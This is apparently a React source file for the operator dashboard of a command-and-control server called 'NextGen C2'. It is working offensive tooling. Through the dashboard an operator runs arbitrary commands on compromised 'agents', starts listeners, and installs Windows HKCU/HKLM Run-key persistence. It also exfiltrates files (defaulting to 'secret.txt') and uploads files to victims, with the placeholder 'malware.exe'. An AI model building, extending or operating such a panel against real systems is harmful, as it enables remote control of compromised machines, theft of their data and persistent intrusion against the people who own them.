import React, { useState, useEffect, useRef } from 'react';
import io from 'socket.io-client';
import axios from 'axios';
import CytoscapeComponent from 'react-cytoscapejs';
import { Terminal, Activity, Network, Shield, Command, User, Lock, Server as ServerIcon, Plus, Trash2, Play, Power, Save, AlertTriangle, Download, Globe, Upload } from 'lucide-react';

function App() {
    // Auth & Connection State
    const [config, setConfig] = useState({
        ip: 'localhost',
        port: '3000',
        token: ''
    });
    const [isAuthenticated, setIsAuthenticated] = useState(false);
    const [socket, setSocket] = useState(null);
    const [error, setError] = useState('');

    // App Data State
    const [agents, setAgents] = useState([]);
    const [logs, setLogs] = useState([]);
    const [listeners, setListeners] = useState([]);
    const [interfaces, setInterfaces] = useState([]);
    const [selectedAgent, setSelectedAgent] = useState(null);
    const [command, setCommand] = useState('');
    const [view, setView] = useState('dashboard'); // dashboard, topology, listeners, persistence, advanced
    const [downloadPath, setDownloadPath] = useState('C:\\Users\\Public\\secret.txt');

    // Listener Form State
    const [newListener, setNewListener] = useState({ port: '5566', host: '0.0.0.0' });

    const logsEndRef = useRef(null);

    // Auto-scroll logs
    useEffect(() => {
        logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }, [logs]);

    // Login Handler
    const handleLogin = async (e) => {
        e.preventDefault();
        setError('');
        const apiUrl = `http://${config.ip}:${config.port}`;

        try {
            // 1. Verify Token via HTTP
            await axios.post(`${apiUrl}/api/login`, {}, {
                headers: { Authorization: config.token }
            });

            // 2. Connect WebSocket
            const newSocket = io(apiUrl, {
                auth: { token: config.token }
            });

            newSocket.on('connect_error', (err) => {
                setError(`Socket Error: ${err.message}`);
                setIsAuthenticated(false);
            });

            newSocket.on('connect', () => {
                setSocket(newSocket);
                setIsAuthenticated(true);
            });

        } catch (err) {
            setError(err.response?.data?.error || 'Connection failed. Check IP/Port/Token.');
        }
    };

    // Data Fetching (Only when authenticated)
    useEffect(() => {
        if (!isAuthenticated || !socket) return;

        const apiUrl = `http://${config.ip}:${config.port}`;
        const headers = { Authorization: config.token };

        const fetchData = async () => {
            try {
                const [resAgents, resLogs, resListeners, resInterfaces] = await Promise.all([
                    axios.get(`${apiUrl}/api/agents`, { headers }),
                    axios.get(`${apiUrl}/api/logs`, { headers }),
                    axios.get(`${apiUrl}/api/listeners`, { headers }),
                    axios.get(`${apiUrl}/api/interfaces`, { headers })
                ]);
                setAgents(resAgents.data);
                setLogs(resLogs.data);
                setListeners(resListeners.data);
                setInterfaces(resInterfaces.data);
            } catch (e) { console.error(e); }
        };

        fetchData();

        socket.on('agents_update', async () => {
            const res = await axios.get(`${apiUrl}/api/agents`, { headers });
            setAgents(res.data);
        });

        socket.on('log_new', (log) => {
            setLogs(prev => [...prev, log]); // Append to end
        });

        return () => {
            socket.off('agents_update');
            socket.off('log_new');
        };
    }, [isAuthenticated, socket, config]);

    const sendCommand = async (e) => {
        e.preventDefault();
        if (!selectedAgent || !command) return;

        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.post(`${apiUrl}/api/command`, {
                agentId: selectedAgent.id,
                command: command
            }, {
                headers: { Authorization: config.token }
            });
            setCommand('');
        } catch (err) {
            alert('Failed to send command');
        }
    };

    const handleAddListener = async (e) => {
        e.preventDefault();
        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.post(`${apiUrl}/api/listeners`, newListener, {
                headers: { Authorization: config.token }
            });
            // Refresh listeners
            const res = await axios.get(`${apiUrl}/api/listeners`, { headers: { Authorization: config.token } });
            setListeners(res.data);
            setNewListener({ port: '', host: '0.0.0.0' });
        } catch (err) {
            alert(err.response?.data?.error || 'Failed to start listener');
        }
    };

    const handleStopListener = async (id) => {
        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.delete(`${apiUrl}/api/listeners/${encodeURIComponent(id)}`, {
                headers: { Authorization: config.token }
            });
            const res = await axios.get(`${apiUrl}/api/listeners`, { headers: { Authorization: config.token } });
            setListeners(res.data);
        } catch (err) {
            alert('Failed to stop listener');
        }
    };

    const handleAgentAction = async (agentId, action) => {
        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.post(`${apiUrl}/api/agent/${agentId}/action`, { action }, {
                headers: { Authorization: config.token }
            });
        } catch (err) {
            alert(`Failed to ${action} agent`);
        }
    };

    const handlePersist = async (agentId, method) => {
        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.post(`${apiUrl}/api/agent/${agentId}/persist`, { method }, {
                headers: { Authorization: config.token }
            });
            alert('Persistence command sent!');
        } catch (err) {
            alert('Failed to send persistence command');
        }
    };

    const handleDownload = async (agentId, path) => {
        const apiUrl = `http://${config.ip}:${config.port}`;
        try {
            await axios.post(`${apiUrl}/api/command`, {
                agentId: agentId,
                command: `download ${path}`
            }, {
                headers: { Authorization: config.token }
            });
            alert(`Download command sent for ${path}`);
        } catch (err) {
            alert('Failed to send download command');
        }
    };

    const [uploadFile, setUploadFile] = useState(null);
    const [uploadFilename, setUploadFilename] = useState('');

    const handleUpload = async () => {
        if (!selectedAgent || !uploadFile || !uploadFilename) return;

        const reader = new FileReader();
        reader.onload = async (e) => {
            const base64 = e.target.result.split(',')[1];
            const apiUrl = `http://${config.ip}:${config.port}`;
            try {
                await axios.post(`${apiUrl}/api/upload`, {
                    agentId: selectedAgent.id,
                    filename: uploadFilename,
                    content: base64
                }, {
                    headers: { Authorization: config.token }
                });
                alert('Upload started!');
                setUploadFile(null);
                setUploadFilename('');
            } catch (err) {
                alert('Upload failed: ' + (err.response?.data?.error || err.message));
            }
        };
        reader.readAsDataURL(uploadFile);
    };

    // Topology Data
    const elements = [
        { data: { id: 'C2', label: 'C2 Server', type: 'server' } },
        ...agents.map(a => ({ data: { id: a.id, label: a.identity, type: 'agent', status: a.status, privilege: a.privilege } })),
        ...agents.map(a => ({ data: { source: 'C2', target: a.id } }))
    ];

    const layout = { name: 'cose', animate: true };
    const style = [
        { selector: 'node[type="server"]', style: { 'background-color': '#ef4444', 'label': 'data(label)', 'color': '#fff' } },
        { selector: 'node[type="agent"]', style: { 'background-color': '#3b82f6', 'label': 'data(label)', 'color': '#fff' } },
        { selector: 'node[privilege="Admin"]', style: { 'background-color': '#eab308' } }, // Yellow/Gold for Admin
        { selector: 'node[status="offline"]', style: { 'background-color': '#64748b' } },
        { selector: 'edge', style: { 'width': 2, 'line-color': '#475569' } }
    ];

    // Login Screen
    if (!isAuthenticated) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-slate-950">
                <div className="bg-slate-900 p-8 rounded-lg border border-slate-800 w-96 shadow-2xl">
                    <div className="flex justify-center mb-6 text-red-500">
                        <Shield size={48} />
                    </div>
                    <h1 className="text-2xl font-bold text-center mb-6 text-white">NextGen C2 Login</h1>

                    {error && (
                        <div className="bg-red-500/10 border border-red-500/50 text-red-500 p-3 rounded mb-4 text-sm text-center">
                            {error}
                        </div>
                    )}

                    <form onSubmit={handleLogin} className="space-y-4">
                        <div>
                            <label className="block text-slate-400 text-sm mb-1">Server IP</label>
                            <div className="relative">
                                <ServerIcon size={16} className="absolute left-3 top-3 text-slate-500" />
                                <input
                                    type="text"
                                    value={config.ip}
                                    onChange={e => setConfig({ ...config, ip: e.target.value })}
                                    className="w-full bg-slate-950 border border-slate-700 rounded py-2 pl-10 pr-3 text-white focus:border-blue-500 focus:outline-none"
                                    placeholder="127.0.0.1"
                                />
                            </div>
                        </div>

                        <div>
                            <label className="block text-slate-400 text-sm mb-1">API Port</label>
                            <div className="relative">
                                <Network size={16} className="absolute left-3 top-3 text-slate-500" />
                                <input
                                    type="text"
                                    value={config.port}
                                    onChange={e => setConfig({ ...config, port: e.target.value })}
                                    className="w-full bg-slate-950 border border-slate-700 rounded py-2 pl-10 pr-3 text-white focus:border-blue-500 focus:outline-none"
                                    placeholder="3000"
                                />
                            </div>
                        </div>

                        <div>
                            <label className="block text-slate-400 text-sm mb-1">Auth Token</label>
                            <div className="relative">
                                <Lock size={16} className="absolute left-3 top-3 text-slate-500" />
                                <input
                                    type="password"
                                    value={config.token}
                                    onChange={e => setConfig({ ...config, token: e.target.value })}
                                    className="w-full bg-slate-950 border border-slate-700 rounded py-2 pl-10 pr-3 text-white focus:border-blue-500 focus:outline-none"
                                    placeholder="Enter token..."
                                />
                            </div>
                        </div>

                        <button
                            type="submit"
                            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded transition-colors"
                        >
                            Connect
                        </button>
                    </form>
                </div>
            </div>
        );
    }

    // Main Dashboard
    return (
        <div className="min-h-screen flex flex-col h-screen">
            {/* Header */}
            <header className="bg-slate-900 border-b border-slate-800 p-4 flex items-center justify-between shrink-0">
                <div className="flex items-center gap-2 text-red-500 font-bold text-xl">
                    <Shield /> NextGen C2 <span className="text-xs bg-slate-800 text-slate-400 px-2 py-1 rounded ml-2">Connected to {config.ip}:{config.port}</span>
                </div>
                <div className="flex gap-4">
                    <button onClick={() => setView('dashboard')} className={`px-4 py-2 rounded ${view === 'dashboard' ? 'bg-slate-800' : ''}`}>Dashboard</button>
                    <button onClick={() => setView('listeners')} className={`px-4 py-2 rounded ${view === 'listeners' ? 'bg-slate-800' : ''}`}>Listeners</button>
                    <button onClick={() => setView('persistence')} className={`px-4 py-2 rounded ${view === 'persistence' ? 'bg-slate-800' : ''}`}>Persistence</button>
                    <button onClick={() => setView('advanced')} className={`px-4 py-2 rounded ${view === 'advanced' ? 'bg-slate-800' : ''}`}>Advanced</button>
                    <button onClick={() => setView('topology')} className={`px-4 py-2 rounded ${view === 'topology' ? 'bg-slate-800' : ''}`}>Topology</button>
                    <button onClick={() => setIsAuthenticated(false)} className="px-4 py-2 rounded bg-red-900/20 text-red-400 hover:bg-red-900/40">Logout</button>
                </div>
            </header>

            <main className="flex-1 flex overflow-hidden">
                {/* Sidebar: Agent List */}
                <aside className="w-64 bg-slate-900 border-r border-slate-800 p-4 overflow-y-auto shrink-0">
                    <h2 className="text-slate-400 uppercase text-xs font-bold mb-4 flex items-center gap-2"><User size={14} /> Agents</h2>
                    <div className="space-y-2">
                        {agents.map(agent => (
                            <div
                                key={agent.id}
                                onClick={() => setSelectedAgent(agent)}
                                className={`p-3 rounded cursor-pointer border ${selectedAgent?.id === agent.id ? 'border-blue-500 bg-blue-500/10' : 'border-slate-800 hover:bg-slate-800'}`}
                            >
                                <div className="flex justify-between items-center mb-1">
                                    <span className="font-mono font-bold">{agent.identity}</span>
                                    <span className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-gray-500'}`}></span>
                                </div>
                                <div className="flex justify-between items-center text-xs">
                                    <span className="text-slate-500">{agent.ip}</span>
                                    <span className={`px-1 rounded ${agent.privilege === 'Admin' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-blue-500/20 text-blue-500'}`}>
                                        {agent.privilege || 'User'}
                                    </span>
                                </div>
                            </div>
                        ))}
                    </div>
                </aside>

                {/* Main Content */}
                <div className="flex-1 flex flex-col bg-slate-950 overflow-hidden">
                    {view === 'dashboard' && (
                        <div className="flex-1 flex flex-col p-4 gap-4 h-full">
                            {/* Stats */}
                            <div className="grid grid-cols-3 gap-4 shrink-0">
                                <div className="bg-slate-900 p-4 rounded border border-slate-800">
                                    <div className="text-slate-400 text-xs">Total Agents</div>
                                    <div className="text-2xl font-bold">{agents.length}</div>
                                </div>
                                <div className="bg-slate-900 p-4 rounded border border-slate-800">
                                    <div className="text-slate-400 text-xs">Online</div>
                                    <div className="text-2xl font-bold text-green-500">{agents.filter(a => a.status === 'online').length}</div>
                                </div>
                                <div className="bg-slate-900 p-4 rounded border border-slate-800">
                                    <div className="text-slate-400 text-xs">Offline</div>
                                    <div className="text-2xl font-bold text-gray-500">{agents.filter(a => a.status !== 'online').length}</div>
                                </div>
                            </div>

                            {/* Terminal / Logs */}
                            <div className="flex-1 bg-slate-900 rounded border border-slate-800 flex flex-col min-h-0">
                                <div className="p-2 border-b border-slate-800 bg-slate-950 flex items-center gap-2 text-sm text-slate-400 shrink-0">
                                    <Terminal size={14} /> Console Output
                                </div>
                                <div className="flex-1 p-4 font-mono text-sm overflow-y-auto space-y-1">
                                    {logs.map(log => (
                                        <div key={log.id} className="break-all whitespace-pre-wrap">
                                            <span className="text-slate-500">[{new Date(log.timestamp).toLocaleTimeString()}]</span>
                                            <span className="text-blue-400 mx-2">[{log.agent_id}]</span>
                                            <span className={log.type === 'command' ? 'text-yellow-400' : 'text-slate-300'}>
                                                {log.type === 'command' ? '> ' : ''}{log.message}
                                            </span>
                                        </div>
                                    ))}
                                    <div ref={logsEndRef} />
                                </div>

                                {/* Command Input */}
                                <form onSubmit={sendCommand} className="p-2 border-t border-slate-800 bg-slate-950 flex gap-2 shrink-0">
                                    <div className="flex items-center px-3 bg-slate-900 border border-slate-700 rounded text-slate-400 text-sm">
                                        {selectedAgent ? selectedAgent.identity : 'Select Agent'}
                                    </div>
                                    <input
                                        type="text"
                                        value={command}
                                        onChange={e => setCommand(e.target.value)}
                                        placeholder="Enter command (e.g. whoami, setid NewUser)..."
                                        className="flex-1 bg-slate-900 border border-slate-700 rounded px-3 py-2 focus:outline-none focus:border-blue-500 font-mono text-sm"
                                        disabled={!selectedAgent}
                                    />
                                    <button
                                        type="submit"
                                        disabled={!selectedAgent}
                                        className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded text-sm font-bold disabled:opacity-50"
                                    >
                                        Send
                                    </button>
                                </form>
                            </div>
                        </div>
                    )}

                    {view === 'listeners' && (
                        <div className="flex-1 p-8 overflow-y-auto">
                            <h2 className="text-2xl font-bold mb-6 flex items-center gap-2"><Network /> Listener Management</h2>

                            {/* Add Listener Form */}
                            <div className="bg-slate-900 p-6 rounded border border-slate-800 mb-8">
                                <h3 className="text-lg font-bold mb-4 text-slate-300">Start New Listener</h3>
                                <form onSubmit={handleAddListener} className="flex gap-4 items-end">
                                    <div className="flex-1">
                                        <label className="block text-slate-400 text-sm mb-1">Interface</label>
                                        <select
                                            value={newListener.host}
                                            onChange={e => setNewListener({ ...newListener, host: e.target.value })}
                                            className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
                                        >
                                            {interfaces.map(iface => (
                                                <option key={iface.address} value={iface.address}>{iface.name} ({iface.address})</option>
                                            ))}
                                        </select>
                                    </div>
                                    <div className="w-32">
                                        <label className="block text-slate-400 text-sm mb-1">Port</label>
                                        <input
                                            type="text"
                                            value={newListener.port}
                                            onChange={e => setNewListener({ ...newListener, port: e.target.value })}
                                            className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 focus:outline-none focus:border-blue-500"
                                            placeholder="5566"
                                        />
                                    </div>
                                    <button type="submit" className="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded font-bold flex items-center gap-2">
                                        <Play size={16} /> Start
                                    </button>
                                </form>
                            </div>

                            {/* Active Listeners List */}
                            <div className="bg-slate-900 rounded border border-slate-800 overflow-hidden">
                                <table className="w-full text-left">
                                    <thead className="bg-slate-950 text-slate-400 text-sm uppercase">
                                        <tr>
                                            <th className="p-4">Interface</th>
                                            <th className="p-4">Port</th>
                                            <th className="p-4">Status</th>
                                            <th className="p-4 text-right">Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody className="divide-y divide-slate-800">
                                        {listeners.length === 0 ? (
                                            <tr><td colSpan="4" className="p-8 text-center text-slate-500">No active listeners</td></tr>
                                        ) : (
                                            listeners.map(l => (
                                                <tr key={l.id} className="hover:bg-slate-800/50">
                                                    <td className="p-4 font-mono">{l.host}</td>
                                                    <td className="p-4 font-mono text-blue-400">{l.port}</td>
                                                    <td className="p-4"><span className="bg-green-500/20 text-green-500 px-2 py-1 rounded text-xs uppercase font-bold">Active</span></td>
                                                    <td className="p-4 text-right">
                                                        <button
                                                            onClick={() => handleStopListener(l.id)}
                                                            className="text-red-400 hover:text-red-300 hover:bg-red-900/20 p-2 rounded"
                                                            title="Stop Listener"
                                                        >
                                                            <Trash2 size={18} />
                                                        </button>
                                                    </td>
                                                </tr>
                                            ))
                                        )}
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    )}

                    {view === 'persistence' && (
                        <div className="flex-1 p-8 overflow-y-auto">
                            <h2 className="text-2xl font-bold mb-6 flex items-center gap-2"><Save /> Persistence & Management</h2>

                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                {agents.filter(a => a.status === 'online').map(agent => (
                                    <div key={agent.id} className="bg-slate-900 border border-slate-800 rounded-lg p-6 shadow-lg">
                                        <div className="flex justify-between items-start mb-4">
                                            <div>
                                                <h3 className="text-xl font-bold text-white">{agent.identity}</h3>
                                                <div className="text-sm text-slate-400 font-mono">{agent.ip}</div>
                                            </div>
                                            <span className={`px-2 py-1 rounded text-xs font-bold uppercase ${agent.privilege === 'Admin' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-blue-500/20 text-blue-500'}`}>
                                                {agent.privilege || 'User'}
                                            </span>
                                        </div>

                                        <div className="space-y-3">
                                            <div className="text-xs text-slate-500 uppercase font-bold mb-2">Persistence Options</div>

                                            {/* HKCU Persistence (Always Available) */}
                                            <div className="flex gap-2">
                                                <button
                                                    onClick={() => handlePersist(agent.id, 'hkcu')}
                                                    className="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 py-2 px-4 rounded flex items-center justify-between group"
                                                    title="Install HKCU Persistence"
                                                >
                                                    <span>HKCU Run</span>
                                                    <span className="w-2 h-2 rounded-full bg-green-500"></span>
                                                </button>
                                                <button
                                                    onClick={() => handlePersist(agent.id, 'clean:hkcu')}
                                                    className="bg-slate-800 hover:bg-red-900/30 text-red-400 py-2 px-3 rounded"
                                                    title="Remove HKCU Persistence"
                                                >
                                                    <Trash2 size={16} />
                                                </button>
                                            </div>

                                            {/* HKLM Persistence (Admin Only) */}
                                            <div className="flex gap-2">
                                                <button
                                                    onClick={() => handlePersist(agent.id, 'hklm')}
                                                    disabled={agent.privilege !== 'Admin'}
                                                    className={`flex-1 py-2 px-4 rounded flex items-center justify-between group ${agent.privilege === 'Admin'
                                                        ? 'bg-slate-800 hover:bg-slate-700 text-slate-200'
                                                        : 'bg-slate-900 border border-slate-800 text-slate-600 cursor-not-allowed'
                                                        }`}
                                                    title="Install HKLM Persistence"
                                                >
                                                    <span>HKLM Run</span>
                                                    {agent.privilege === 'Admin' ? (
                                                        <span className="w-2 h-2 rounded-full bg-yellow-500"></span>
                                                    ) : (
                                                        <Lock size={14} />
                                                    )}
                                                </button>
                                                <button
                                                    onClick={() => handlePersist(agent.id, 'clean:hklm')}
                                                    disabled={agent.privilege !== 'Admin'}
                                                    className={`py-2 px-3 rounded ${agent.privilege === 'Admin'
                                                        ? 'bg-slate-800 hover:bg-red-900/30 text-red-400'
                                                        : 'bg-slate-900 border border-slate-800 text-slate-600 cursor-not-allowed'
                                                        }`}
                                                    title="Remove HKLM Persistence"
                                                >
                                                    <Trash2 size={16} />
                                                </button>
                                            </div>

                                            <div className="h-px bg-slate-800 my-4"></div>
                                            <div className="text-xs text-slate-500 uppercase font-bold mb-2">Session Control</div>

                                            <div className="flex gap-2">
                                                <button
                                                    onClick={() => handleAgentAction(agent.id, 'disconnect')}
                                                    className="flex-1 bg-orange-900/20 hover:bg-orange-900/40 text-orange-500 py-2 rounded font-bold text-sm"
                                                >
                                                    Disconnect
                                                </button>
                                                <button
                                                    onClick={() => handleAgentAction(agent.id, 'terminate')}
                                                    className="flex-1 bg-red-900/20 hover:bg-red-900/40 text-red-500 py-2 rounded font-bold text-sm"
                                                >
                                                    Terminate
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                ))}
                                {agents.filter(a => a.status === 'online').length === 0 && (
                                    <div className="col-span-full text-center py-12 text-slate-500">
                                        <AlertTriangle className="mx-auto mb-4 opacity-50" size={48} />
                                        No online agents available for management.
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {view === 'advanced' && (
                        <div className="flex-1 p-8 overflow-y-auto">
                            <h2 className="text-2xl font-bold mb-6 flex items-center gap-2"><Globe /> Advanced Features</h2>

                            <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                                {/* File Download Section */}
                                <div className="bg-slate-900 p-6 rounded border border-slate-800">
                                    <h3 className="text-xl font-bold mb-4 flex items-center gap-2 text-blue-400">
                                        <Download size={20} /> File Download
                                    </h3>
                                    <p className="text-slate-400 mb-4 text-sm">
                                        Download files from the selected agent. Files will be saved to the server's <code>downloads/</code> directory.
                                    </p>

                                    <div className="space-y-4">
                                        <div>
                                            <label className="block text-slate-500 text-xs uppercase font-bold mb-2">Target Agent</label>
                                            <select
                                                className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white focus:outline-none focus:border-blue-500"
                                                value={selectedAgent ? selectedAgent.id : ''}
                                                onChange={e => {
                                                    const agent = agents.find(a => a.id === e.target.value);
                                                    setSelectedAgent(agent);
                                                }}
                                            >
                                                <option value="">Select an Agent...</option>
                                                {agents.filter(a => a.status === 'online').map(a => (
                                                    <option key={a.id} value={a.id}>{a.identity} ({a.ip})</option>
                                                ))}
                                            </select>
                                        </div>

                                        <div>
                                            <label className="block text-slate-500 text-xs uppercase font-bold mb-2">Remote File Path</label>
                                            <input
                                                type="text"
                                                value={downloadPath}
                                                onChange={e => setDownloadPath(e.target.value)}
                                                className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 font-mono text-sm text-white focus:outline-none focus:border-blue-500"
                                                placeholder="C:\Users\Public\secret.txt"
                                            />
                                        </div>

                                        <button
                                            onClick={() => {
                                                if (selectedAgent && downloadPath) {
                                                    handleDownload(selectedAgent.id, downloadPath);
                                                }
                                            }}
                                            disabled={!selectedAgent || !downloadPath}
                                            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                                        >
                                            <Download size={16} /> Start Download
                                        </button>
                                    </div>
                                </div>

                                {/* File Upload Section */}
                                <div className="bg-slate-900 p-6 rounded border border-slate-800">
                                    <h3 className="text-xl font-bold mb-4 flex items-center gap-2 text-green-400">
                                        <Upload size={20} /> File Upload
                                    </h3>
                                    <p className="text-slate-400 mb-4 text-sm">
                                        Upload a file from your computer to the selected agent.
                                    </p>

                                    <div className="space-y-4">
                                        <div>
                                            <label className="block text-slate-500 text-xs uppercase font-bold mb-2">Target Agent</label>
                                            <select
                                                className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white focus:outline-none focus:border-blue-500"
                                                value={selectedAgent ? selectedAgent.id : ''}
                                                onChange={e => {
                                                    const agent = agents.find(a => a.id === e.target.value);
                                                    setSelectedAgent(agent);
                                                }}
                                            >
                                                <option value="">Select an Agent...</option>
                                                {agents.filter(a => a.status === 'online').map(a => (
                                                    <option key={a.id} value={a.id}>{a.identity} ({a.ip})</option>
                                                ))}
                                            </select>
                                        </div>

                                        <div>
                                            <label className="block text-slate-500 text-xs uppercase font-bold mb-2">Select File</label>
                                            <input
                                                type="file"
                                                onChange={e => setUploadFile(e.target.files[0])}
                                                className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white text-sm focus:outline-none focus:border-blue-500"
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-slate-500 text-xs uppercase font-bold mb-2">Remote Filename</label>
                                            <input
                                                type="text"
                                                value={uploadFilename}
                                                onChange={e => setUploadFilename(e.target.value)}
                                                placeholder="C:\Windows\Temp\malware.exe"
                                                className="w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-white text-sm focus:outline-none focus:border-blue-500"
                                            />
                                        </div>

                                        <button
                                            onClick={handleUpload}
                                            disabled={!selectedAgent || !uploadFile || !uploadFilename}
                                            className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-2 rounded disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                                        >
                                            <Upload size={16} /> Start Upload
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {view === 'topology' && (
                        <div className="flex-1 relative h-full">
                            <CytoscapeComponent
                                elements={elements}
                                layout={layout}
                                stylesheet={style}
                                className="w-full h-full"
                            />
                        </div>
                    )}
                </div>
            </main>
        </div>
    );
}

export default App;
